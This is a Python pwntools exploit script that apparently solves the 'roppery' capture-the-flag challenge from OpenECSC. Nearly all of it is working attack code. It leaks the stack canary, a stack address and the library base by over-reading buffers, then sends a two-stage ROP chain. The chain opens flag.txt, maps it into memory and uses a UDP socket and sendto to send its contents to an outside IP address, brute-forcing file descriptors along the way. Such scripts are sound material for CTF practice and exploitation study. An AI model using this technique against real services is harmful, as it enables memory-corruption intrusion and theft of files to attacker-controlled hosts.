#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template '--host=challenges.open.ecsc.no' '--port=1113' ./lib/ld-musl-x86_64.so.1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('server')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenges.open.ecsc.no'
port = int(args.PORT or 1113)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug(["./lib/ld-musl-x86_64.so.1", "server"] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(["./lib/ld-musl-x86_64.so.1", "server"] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


# bruteforce fd of open and socket
for i in range(5, 10):
  for j in range(6, 11):
    print(i,j)

    io = start(env={"LD_LIBRARY_PATH":"/home/samuele/ctf/OpenECSC/roppery_SOLVED/usr/lib"})

    io.sendlineafter(b"Data: ", b"A"*23)
    io.recv(24)
    canary = u64(io.recv(8))
    info(f"{hex(canary)=}")

    io.sendlineafter(b"Data: ", b"A"*31)
    io.recv(32)
    stack = u64(io.recv(6).ljust(8, b"\x00")) - 32 - 0x30
    info(f"{hex(stack)=}")

    io.sendlineafter(b"Data: ", b"A"*87)
    io.recv(88)
    base = u64(io.recv(6).ljust(8, b"\x00")) - 0x1ca03
    info(f"{hex(base)=}")

    #=======================================================
    #            GADGETS
    #=======================================================

    pop_rdx_ret = p64(base + 0x00000000000162fb)
    ret = p64(base + 0x00000000000162fc)
    pop_rsi_ret = p64(base + 0x00000000000162bd)
    pop_rdi_ret = p64(base + 0x0000000000015c67)
    socket = p64(base + 0x00000000003c759)
    pop_rax_ret = p64(base + 0x0000000000016d20)
    pop_r8_pop_r9 = p64(base + 0x00000000000463b0) #pop r8; pop r9; add rsp, 0x10; pop rbx
    pop_rcx_ret = p64(base + 0x000000000001527f)
    sendto = p64(base + 0x00000000003c6b3)
    read = p64(base + 0x000000000005876b)
    syscall = p64(base + 0x0000000000016170)
    pop_rsp_ret = p64(base + 0x000000000001642e)
    mmap = p64(base + 0x0000000000036414)
    fopen = p64(base + 0x0000000000048912)
    open = p64(base + 0x000000000001d32a)
    syscall = p64(base + 0x0000000000016170)

    # stack + qualcosa
    # 0xd6230457d0070002 struct value

    rop_chain = flat(
        #stack fix
        # pop_rsp_ret
        # p64(stack),
        #open
        pop_rdi_ret,
        p64(stack), # "flag.txt"
        pop_rsi_ret,
        p64(0),
        pop_rdx_ret,
        p64(0),
        open,
        #mmap
        pop_r8_pop_r9,
        p64(i), #r8
        p64(0), #r9
        p64(0), 
        p64(0),
        p64(0),
        pop_rcx_ret,
        p64(1),
        pop_rdx_ret,
        p64(1),
        pop_rsi_ret,
        p64(0x1000), # mmap size
        pop_rdi_ret,
        p64(0x12340000),
        mmap,
        #creo socket
        pop_rdx_ret,
        p64(0x11),
        pop_rsi_ret,
        p64(0x2),
        pop_rdi_ret,
        p64(0x2),
        socket,
        #sendto
        pop_rdi_ret,
        p64(j),
        pop_rsi_ret,
        p64(0x12340000),
        pop_rdx_ret,
        p64(50),
        pop_rcx_ret,
        p64(0),
        pop_r8_pop_r9,
        p64(stack+8+360), #struct value
        p64(16),
        p64(0),
        p64(0),
        p64(0),
        sendto,
        p64(0xfe47174fd0070002),
        # p64(0x3a9feba7697a0002),
    )

    stage2 = flat(
        # p64(0x78742e67616c662f),
        p64(0x7478742e67616c66),
        # b"\x74\x00\x00\x00",
        b"\x00\x00\x00\x00",
        b"\x00\x00\x00\x00",
        # b"\x00\x00\x62\x71",
        rop_chain
    )        

    stage1 = flat(
        b"I give up ...AAA",
        p64(0xfe47174fd0070002),
        p64(canary),
        b"A"*8,
        pop_rdi_ret,
        p64(0),
        pop_rsi_ret,
        p64(stack),
        pop_rdx_ret,
        p64(len(stage2)),
        read
    )

    io.sendlineafter(b"Data: ", stage1)
    io.send(stage2)
    time.sleep(0.5)
    io.close()
